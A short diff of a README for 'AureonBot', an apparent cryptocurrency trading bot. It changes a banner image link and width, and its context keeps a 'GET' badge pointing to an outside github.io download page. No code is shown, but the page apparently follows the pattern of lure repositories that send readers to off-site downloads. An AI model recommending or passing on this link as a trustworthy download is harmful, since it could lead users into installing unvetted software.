@@ -1,8 +1,9 @@
 # AureonBot
 
 <p align="center">
-<img src="https://prnt.sc/CwgtYUnBj3BY" alt="AureonBot Automated Cryptocurrency Trading Platform" width="500">
+<img src="https://prnt.sc/yG51G-a1GDqU" alt="AureonBot Automated Cryptocurrency Trading Platform" width="780">
 </p>
+
 
 [![GET — AUREONBOT](https://img.shields.io/badge/GET-AUREONBOT-2563eb?style=for-the-badge)](https://neivesdesignrack.github.io/.github/AureonBot)
 
